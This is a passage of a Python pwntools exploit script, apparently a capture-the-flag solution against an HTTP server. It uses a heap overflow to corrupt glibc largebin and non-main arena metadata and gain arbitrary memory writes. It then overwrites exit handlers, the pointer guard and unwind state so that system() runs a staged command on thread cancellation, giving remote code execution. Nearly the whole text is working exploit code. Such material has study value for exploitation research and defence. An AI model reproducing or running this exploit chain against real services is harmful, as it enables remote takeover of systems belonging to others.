        MALLOC_STATE_NEXT_FREE_OFF:MALLOC_STATE_NEXT_FREE_OFF + SIZE_SZ
    ] = p64(0)
    mstate[
        MALLOC_STATE_ATTACHED_THREADS_OFF:
        MALLOC_STATE_ATTACHED_THREADS_OFF + SIZE_SZ
    ] = p64(1)
    mstate[
        MALLOC_STATE_SYSTEM_MEM_OFF:MALLOC_STATE_SYSTEM_MEM_OFF + SIZE_SZ
    ] = p64(plan.system_mem)
    mstate[
        MALLOC_STATE_MAX_SYSTEM_MEM_OFF:
        MALLOC_STATE_MAX_SYSTEM_MEM_OFF + SIZE_SZ
    ] = p64(plan.system_mem)

    payload[0x10:] = mstate
    return bytes(payload)


def prove_nonmain_top_pivot(
    state: UnsortedLeakState,
    plan: RemainderWritePlan,
    heap_writes: dict[int, bytes] | None = None,
) -> int:
    if state.heap_base is None:
        log.failure("top pivot needs the non-main heap leak")

    idx = state.arena_idx
    large_body_len = body_len_for_chunk(PIVOT_LARGE_CHUNK_SIZE)
    guard_body_len = body_len_for_chunk(PIVOT_GUARD_CHUNK_SIZE)
    sort_body_len = body_len_for_chunk(PIVOT_SORT_CHUNK_SIZE)
    smash_body_len = body_len_for_chunk(TOP_SMASH_BODY_CHUNK_SIZE)

    large_slot = take_arena_slot(idx, b"pivot-large")
    slot_send_blocked_post(
        large_slot,
        b"/pivot-large",
        large_body_len,
        b"L".ljust(large_body_len - 1, b"L"),
    )

    guard_slot = take_arena_slot(idx, b"pivot-guard")
    slot_send_blocked_post(
        guard_slot,
        b"/pivot-guard",
        guard_body_len,
        b"G".ljust(guard_body_len - 1, b"G"),
    )

    trigger_slot = take_arena_slot(idx, b"pivot-trigger")
    slot_send_prearmed_post(trigger_slot, b"/pivot-trigger", large_body_len)

    smash_slot = take_arena_slot(idx, b"top-smash")
    slot_send_prearmed_post(smash_slot, b"/top-smash", smash_body_len)
    state.top_smash_slot = smash_slot

    remainder_slot = take_arena_slot(idx, b"remainder-write")
    slot_send_prearmed_post(
        remainder_slot,
        b"/remainder-write",
        REMAINDER_STUB_BODY_LEN,
    )
    state.remainder_slot = remainder_slot

    log.info("freeing the pivot large chunk with a live large guard after it")
    large_resp = slot_finish_body(large_slot, b"Z", timeout=3.0)
    if not large_resp.startswith(b"HTTP/1.1 200 OK"):
        log.failure(f"large free response was not clean: {large_resp[:100]!r}")

    sort_slot = take_arena_slot(idx, b"pivot-sort")
    slot_send_blocked_post(
        sort_slot,
        b"/pivot-sort",
        sort_body_len,
        b"S".ljust(sort_body_len - 1, b"S"),
    )

    heap = state.heap_base
    arena = state.primary
    large = heap + PIVOT_LARGE_HEADER_OFF
    forged_top = heap + PIVOT_TOP_AFTER_SORT_OFF
    top_ptr = arena + MALLOC_STATE_TOP_OFF
    largebin = arena + PIVOT_LARGEBIN_OFF
    expected_top = heap + 0x10
    flags = PREV_INUSE | NON_MAIN_ARENA_FLAG
    trigger_value = str(large_body_len).encode()
    trigger_key = heap + PIVOT_TRIGGER_HEADER_OFF + 0x20
    trigger_val = trigger_key + len(b"Content-Length") + 1
    smash_value = str(smash_body_len).encode()
    smash_key = heap + PIVOT_SMASH_HEADER_OFF + 0x20
    smash_val = smash_key + len(b"Content-Length") + 1
    smash_prev_size = (trigger_value[1:] + b"\x00").ljust(SIZE_SZ, b"\x00")
    remainder_value = str(plan.body_len).encode()
    remainder_value_addr = heap + PIVOT_REMAINDER_VALUE_OFF
    remainder_prev_size = (smash_value[1:] + b"\x00").ljust(SIZE_SZ, b"\x00")

    writes: dict[int, bytes] = {
        # Restore the prearmed trigger Content-Length header after the
        # negative overflow crosses the stale 0x30 header region.
        PIVOT_TRIGGER_HEADER_OFF + 0x00: p64(0),
        PIVOT_TRIGGER_HEADER_OFF + 0x08: p64(0x30 | flags),
        PIVOT_TRIGGER_HEADER_OFF + 0x10: p64(0),
        PIVOT_TRIGGER_HEADER_OFF + 0x18: p64(trigger_val),
        PIVOT_TRIGGER_HEADER_OFF
        + 0x20: b"Content-Length\x00" + trigger_value + b"\x00",
        # Restore the prearmed top-smash body request.  Its binary body is
        # what safely rewrites the arena prefix after the top pivot.  The
        # trigger Content-Length value overlaps this chunk's prev_size.
        PIVOT_SMASH_HEADER_OFF + 0x00: smash_prev_size,
        PIVOT_SMASH_HEADER_OFF + 0x08: p64(0x30 | flags),
        PIVOT_SMASH_HEADER_OFF + 0x10: p64(0),
        PIVOT_SMASH_HEADER_OFF + 0x18: p64(smash_val),
        PIVOT_SMASH_HEADER_OFF
        + 0x20: b"Content-Length\x00" + smash_value + b"\x00",
        # Restore the remainder-trigger Content-Length header.  Keep the
        # header chunk small and redirect Header.val to a fake decimal string
        # so this prearmed allocation still has the old 0x30 geometry.
        PIVOT_REMAINDER_HEADER_OFF + 0x00: remainder_prev_size,
        PIVOT_REMAINDER_HEADER_OFF + 0x08: p64(0x30 | flags),
        PIVOT_REMAINDER_HEADER_OFF + 0x10: p64(0),
        PIVOT_REMAINDER_HEADER_OFF + 0x18: p64(remainder_value_addr),
        PIVOT_REMAINDER_HEADER_OFF + 0x20: b"Content-Length\x00X\x00",
        PIVOT_REMAINDER_VALUE_OFF: remainder_value + b"\x00",
        # Real sorted largebin chunk.  Its bk_nextsize points at the forged
        # top chunk so the largebin scan unlinks that chunk.
        PIVOT_LARGE_HEADER_OFF + 0x00: p64(0),
        PIVOT_LARGE_HEADER_OFF + 0x08: p64(PIVOT_LARGE_CHUNK_SIZE | flags),
        PIVOT_LARGE_HEADER_OFF + 0x10: p64(largebin),
        PIVOT_LARGE_HEADER_OFF + 0x18: p64(largebin),
        PIVOT_LARGE_HEADER_OFF + 0x20: p64(large),
        PIVOT_LARGE_HEADER_OFF + 0x28: p64(forged_top),
        # Current top forged as a valid largebin chunk.  The nextsize unlink
        # side effect writes arena->top = heap + 0x10.
        PIVOT_TOP_AFTER_SORT_OFF + 0x00: p64(0),
        PIVOT_TOP_AFTER_SORT_OFF + 0x08: p64(PIVOT_LARGE_CHUNK_SIZE | flags),
        PIVOT_TOP_AFTER_SORT_OFF + 0x10: p64(forged_top),
        PIVOT_TOP_AFTER_SORT_OFF + 0x18: p64(forged_top),
        PIVOT_TOP_AFTER_SORT_OFF + 0x20: p64(top_ptr - 0x28),
        PIVOT_TOP_AFTER_SORT_OFF + 0x28: p64(top_ptr - 0x20),
        PIVOT_TOP_AFTER_SORT_OFF + PIVOT_LARGE_CHUNK_SIZE: p64(
            PIVOT_LARGE_CHUNK_SIZE
        ),
    }
    if heap_writes:
        for off, data in heap_writes.items():
            writes[off] = data

    end_off = PIVOT_TOP_AFTER_SORT_OFF + PIVOT_LARGE_CHUNK_SIZE + 0x10
    if heap_writes:
        end_off = max(end_off, max(off + len(data) for off, data in heap_writes.items()))
    log.info("corrupting largebin metadata and forging the current top chunk")
    send_heap_overflow(state, writes, end_off)

    log.info("triggering largebin unlink pivot")
    trigger_slot.tube.send(b"\r\n")
    delay(0.5)

    log.success(f"expected non-main arena->top: {expected_top:#x}")
    return expected_top


def trigger_nonmain_remainder_write(
    state: UnsortedLeakState,
    plan: RemainderWritePlan,
) -> None:
    if state.heap_base is None:
        log.failure("remainder write needs the non-main heap leak")
    if state.top_smash_slot is None:
        log.failure("arena rewrite body was not prearmed")
    if state.remainder_slot is None:
        log.failure("remainder trigger body was not prearmed")

    victim_size_ptr = plan.victim + SIZE_SZ

    log.info(
        "remainder write plan: "
        f"victim={plan.victim:#x}, "
        f"nb={plan.nb:#x}, "
        f"remainder={plan.remainder:#x}, "
        f"write_addr={plan.write_addr:#x}, "
        f"value={plan.written_value:#x}"
    )

    prefix = build_nonmain_arena_rewrite(state, plan)
    log.info("rewriting non-main arena top/system_mem with the pivot allocation")
    state.top_smash_slot.tube.send(b"\r\n" + prefix)
    delay(0.3)

    log.info("overwriting forged top chunk size with the negative BOF")
    send_heap_overflow(
        state,
        {
            plan.victim - state.heap_base: p64(0),
            victim_size_ptr - state.heap_base: p64(plan.top_size | PREV_INUSE),
        },
        (victim_size_ptr - state.heap_base) + SIZE_SZ,
        filler=b"C",
    )

    log.info("triggering top remainder header write")
    state.remainder_slot.tube.send(b"\r\n")
    delay(0.5)

    log.success(
        f"expected remainder write: *{plan.write_addr:#x} = "
        f"{plan.written_value:#x}"
    )


def perform_nonmain_remainder_write(
    state: UnsortedLeakState,
    write_addr: int,
    write_value: int = REMAINDER_AFTER_SIZE | PREV_INUSE,
    heap_writes: dict[int, bytes] | None = None,
) -> tuple[int, RemainderWritePlan]:
    plan = build_remainder_write_plan(state, write_addr, write_value)
    pivot_top = prove_nonmain_top_pivot(state, plan, heap_writes=heap_writes)
    trigger_nonmain_remainder_write(state, plan)
    return pivot_top, plan


def perform_fresh_nonmain_write(
    arena_idx: int,
    write_addr: int,
    write_value: int,
    heap_writes: dict[int, bytes] | None = None,
) -> tuple[UnsortedLeakState, int, RemainderWritePlan]:
    state = leak_nonmain_unsorted_at(arena_idx)
    pivot_top, plan = perform_nonmain_remainder_write(
        state,
        write_addr,
        write_value,
        heap_writes=heap_writes,
    )
    return state, pivot_top, plan


def build_main_cancel_rce_plan(libc_base: int, target: int) -> MainCancelRcePlan:
    fs_base = main_tls_base(libc_base)
    system_target = arg_int(args.SYSTEMADDR, libc_symbol(libc_base, "system"))
    stored, guard, system_stored = choose_exit_handler_mangle(
        target,
        system_target,
    )
    exit_initial = libc_offset(libc_base, EXIT_INITIAL_OFF)
    exit_handler = (
        exit_initial
        + EXIT_LIST_FNS_OFF
        + EXIT_EXISTING_HANDLER_INDEX * EXIT_FUNCTION_SIZE
    )
    return MainCancelRcePlan(
        fs_base=fs_base,
        pointer_guard=fs_base + TLS_POINTER_GUARD_OFF,
        cancelhandling=fs_base + TLS_CANCELHANDLING_OFF,
        unwind_forced=libc_offset(libc_base, UNWIND_GLOBAL_OFF)
        + UNWIND_FORCED_UNWIND_OFF,
        global_libgcc_handle=libc_offset(
            libc_base,
            UNWIND_GLOBAL_LIBGCC_HANDLE_OFF,
        ),
        target=target,
        stored=stored,
        guard=guard,
        system_target=system_target,
        system_stored=system_stored,
        exit_fn=exit_handler + EXIT_FUNCTION_CXA_FN_OFF,
        exit_arg=exit_handler + EXIT_FUNCTION_CXA_ARG_OFF,
        command=system_command(),
    )


def trigger_main_cancel() -> None:
    log.info("triggering main-thread cancellation through accept")
    import ssl

    host, port = host_port()
    trigger_ssl = any(
        isinstance(getattr(tube, "sock", None), ssl.SSLSocket)
        for tube in pinned_sockets
    )
    socks = []
    for _ in range(2):
        try:
            socks.append(remote(host, port, ssl=trigger_ssl, timeout=1.0))
            delay(0.1)
        except (PwnlibException, OSError) as exc:
            log.info(f"trigger connection failed after cancellation: {exc}")
            break
    delay(0.5)
    drain_rce_output(
        [(f"trigger-{idx}", sock) for idx, sock in enumerate(socks)],
        timeout=arg_float(args.TRIGGERTIMEOUT, 3.0),
    )
    for sock in socks:
        close_socket(sock)
    if server is not None:
        for _ in range(20):
            status = server.poll()
            if status is not None:
                log.success(f"local challenge exited after RCE trigger: {status}")
                return
            delay(0.1)
        log.warning("local challenge is still running after RCE trigger")


def stage_main_cancel_rce(libc_base: int) -> MainCancelRcePlan:
    target_name = args.RCEFUNC or "exit"
    target = arg_int(args.RCEADDR, libc_symbol(libc_base, target_name))
    plan = build_main_cancel_rce_plan(libc_base, target)

    log.info(
        "main cancel RCE plan: "
        f"fs={plan.fs_base:#x}, "
        f"target={plan.target:#x}, "
        f"stored={plan.stored:#x}, "
        f"guard={plan.guard:#x}, "
        f"system={plan.system_target:#x}, "
        f"system_stored={plan.system_stored:#x}, "
        f"exit_fn={plan.exit_fn:#x}, "
        f"exit_arg={plan.exit_arg:#x}, "
        f"command={plan.command!r}"
    )
    log.info("staging main pointer_guard and heap command")
    command_state, _, _ = perform_fresh_nonmain_write(
        1,
        plan.pointer_guard,
        plan.guard,
        heap_writes={HEAP_SYSTEM_COMMAND_OFF: plan.command},
    )
    if command_state.heap_base is None:
        log.failure("missing heap base for command stash")
    plan.command_addr = command_state.heap_base + HEAP_SYSTEM_COMMAND_OFF
    log.info(f"heap command: {plan.command_addr:#x} -> {plan.command!r}")
    log.info("overwriting existing exit handler function with system")
    perform_fresh_nonmain_write(2, plan.exit_fn, plan.system_stored)
    log.info("overwriting existing exit handler argument")
    perform_fresh_nonmain_write(3, plan.exit_arg, plan.command_addr)
    log.info("staging unwind forced-unwind function pointer to exit")
    perform_fresh_nonmain_write(4, plan.unwind_forced, plan.stored)
    log.info("staging non-null global_libgcc_handle")
    perform_fresh_nonmain_write(
        5,
        plan.global_libgcc_handle,
        GLOBAL_LIBGCC_HANDLE_VALUE,
    )
    log.info("staging main cancelhandling CANCELED bit")
    perform_fresh_nonmain_write(
        6,
        plan.cancelhandling - MAIN_CANCEL_BYTE_WRITE_BACKSHIFT,
        MAIN_CANCEL_BYTE_WRITE_VALUE,
    )

    trigger_main_cancel()
    return plan


def main() -> None:
    try:
        start()
        reset_external_service()
        build_arena_pool(arg_int(args.POOLROUNDS, 12))
        libc_state = leak_libc_unsorted()
        main_arena = libc_symbol(libc_state.primary, "main_arena")
        rce_plan = stage_main_cancel_rce(libc_state.primary)
        log.info(
            "rce proof point: "
            f"libc={libc_state.primary:#x}, "
            f"main_arena={main_arena:#x}, "
            f"main_heap={fmt_ptr(libc_state.heap_leak)}, "
            f"fs={rce_plan.fs_base:#x}, "
            f"pointer_guard={rce_plan.pointer_guard:#x}, "
            f"unwind_forced={rce_plan.unwind_forced:#x}, "
            f"global_libgcc_handle={rce_plan.global_libgcc_handle:#x}, "
            f"cancelhandling={rce_plan.cancelhandling:#x}, "
            f"target={rce_plan.target:#x}, "
            f"system={rce_plan.system_target:#x}, "
            f"exit_fn={rce_plan.exit_fn:#x}, "
            f"exit_arg={rce_plan.exit_arg:#x}, "
            f"command_addr={rce_plan.command_addr:#x}"
        )
    finally:
        close_holders()
        if server is not None:
            server.close()


if __name__ == "__main__":
    main()
